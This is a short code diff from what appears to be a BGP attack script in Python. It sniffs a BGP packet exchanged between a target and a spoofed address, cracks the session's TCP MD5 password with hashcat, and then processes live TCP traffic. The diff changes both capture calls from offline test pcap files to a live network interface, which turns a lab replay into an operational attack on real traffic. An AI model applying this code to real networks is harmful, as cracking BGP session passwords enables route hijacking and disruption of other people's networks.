@@ -123,13 +123,13 @@ def main(argv):
     INTERFACE = argv[1]
 
     print("[*] Sniffing a packet to break TCP MD5 password")
-    packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, offline="captures/attack_test.pcap")[0]
+    packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, iface=INTERFACE)[0]
     print("[*] Packet found !")
     print("[*] Breaking password")
     global BGP_password
     BGP_password = break_password(packet_to_break, hashcat_mask)
     print("[*] Password broken: " + BGP_password)
-    sniff(prn=lambda p : packet_callback(p), offline="captures/bgp_simulation.pcap", filter="tcp")
+    sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)
 
 
 
